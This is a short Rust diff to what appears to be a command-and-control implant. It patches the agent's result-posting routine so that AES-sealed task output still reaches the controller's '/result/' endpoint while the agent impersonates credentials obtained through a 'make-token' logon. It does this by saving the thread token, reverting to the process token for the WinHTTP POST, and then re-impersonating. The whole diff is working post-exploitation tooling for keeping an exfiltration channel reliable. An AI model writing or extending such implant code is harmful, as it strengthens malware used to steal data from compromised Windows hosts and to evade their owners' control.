@@ -845,6 +845,36 @@ impl AgentTransport {
         }).to_string();
         let enc  = crypto::seal(&self.aes_key, plain.as_bytes());
         let path = format!("/result/{}", self.agent_id);
+        // Drop thread impersonation before POST so WinHTTP uses the process
+        // primary token; a make-token LOGON_NEW_CREDENTIALS context can
+        // cause WinHTTP POSTs to fail silently.
+        #[cfg(target_os = "windows")]
+        {
+            use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
+            use windows_sys::Win32::Security::{
+                DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
+                SecurityImpersonation, TokenImpersonation, TOKEN_ALL_ACCESS,
+            };
+            use windows_sys::Win32::System::Threading::{GetCurrentThread, OpenThreadToken};
+            let mut h_saved: HANDLE = 0;
+            unsafe {
+                let mut h_th: HANDLE = 0;
+                if OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, 1, &mut h_th) != 0 {
+                    DuplicateTokenEx(h_th, TOKEN_ALL_ACCESS, core::ptr::null(),
+                        SecurityImpersonation as i32, TokenImpersonation as i32, &mut h_saved);
+                    CloseHandle(h_th);
+                    RevertToSelf();
+                }
+            }
+            let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
+            if h_saved != 0 {
+                unsafe {
+                    ImpersonateLoggedOnUser(h_saved);
+                    CloseHandle(h_saved);
+                }
+            }
+        }
+        #[cfg(not(target_os = "windows"))]
         let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
     }
 
